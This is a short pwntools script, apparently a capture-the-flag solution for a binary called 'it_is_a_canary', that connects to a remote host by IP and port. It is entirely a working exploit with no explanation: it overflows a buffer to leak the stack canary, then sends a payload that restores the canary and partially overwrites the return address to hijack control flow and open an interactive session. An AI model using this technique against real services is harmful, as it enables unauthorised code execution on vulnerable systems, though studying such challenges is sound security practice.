#124E
from pwn import *
r=remote("27.25.151.26",51981)
#r=process("./it_is_a_canary")
#gdb.attach(r)
#pause()
context.log_level='debug'
r.recvuntil("Is it a canary?")
r.send(b'a'*25)
r.recvuntil(b'a'*25)
canary=u64(r.recv(7).rjust(8,b'\x00'))
print(hex(canary))

pay=b'a'*24+p64(canary)+p64(0)+b'\x53\xa2'
r.send(pay)
r.interactive()
